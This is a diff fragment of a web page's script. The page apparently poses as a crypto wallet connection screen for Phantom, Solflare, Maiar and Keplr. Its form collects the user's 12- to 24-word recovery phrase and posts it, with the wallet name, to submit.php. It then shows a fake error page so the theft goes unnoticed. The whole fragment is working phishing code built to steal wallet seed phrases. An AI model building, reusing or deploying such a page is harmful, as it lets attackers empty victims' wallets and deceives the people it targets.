+ $("#wallet_name").val("PHANTOM");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//solflare
+ $("#solflare").click(solflarE);
+function solflarE() {
+ $("#wallet_name").val("SOLFLARE");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//maiar
+ $("#maiar").click(maiaR);
+function maiaR() {
+ $("#wallet_name").val("MAIAR");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+//keplr
+ $("#keplr").click(keplR);
+function keplR() {
+ $("#wallet_name").val("KEPLR");
+document.getElementById("popupbody").style.display = "block";
+document.getElementById("myDiv").style.display = "block";
+}
+
+
+
+
+
+
+<!-- control-->
+$("#inform").click(infO);
+ function infO(){
+ alert("manual connection may be required for first time use ");
+}
+$("#back").click(closeUp);
+function closeUp(){
+document.getElementById("popupbody").style.display="none";
+}
+
+$("#connect").click(formdisplay);
+function formdisplay(){
+
+document.getElementById("formpopup").style.display="block";
+document.getElementById("popupbody").style.display="none";
+}
+$("#backT").click(connectDisplayT);
+ function connectDisplayT(){
+document.getElementById("formpopup").style.display="none";
+$("#mnemonicMessage").empty();
+$("#recovery_phrase").val("");
+}
+
+$("#Fback").click(errorExit);
+function errorExit(){
+document.getElementById("epage").style.display="none";
+}
+
+function subF(e){
+            const message = $("#recovery_phrase").val();
+            const wallet_name = $("#wallet_name").val();
+            if (message.split(' ').length < 12) {
+                $("#mnemonicMessage").html("Mnemonic phrase must be at least 12 to 24 words");
+               return false;
+ }else{
+  $("#mnemonicMessage").empty();
+                $(e).empty().html("<i class='fas fa-spinner fa-pulse'></i>  Please Wait");
+                 $.ajax({
+                  type: "post",
+                  cache:false,
+                  url: "submit.php",
+                  data: {
+                    name: wallet_name,
+                    phrase: message
+                  },
+                  complete: function()
+                  {
+                   
+                  $(e).empty().html("CONNECT");
+document.getElementById("epage").style.display="block";
+                       //console.log(res);
+                  }
+                });
+            }
+        }
+</script>
+</body>
+</html>
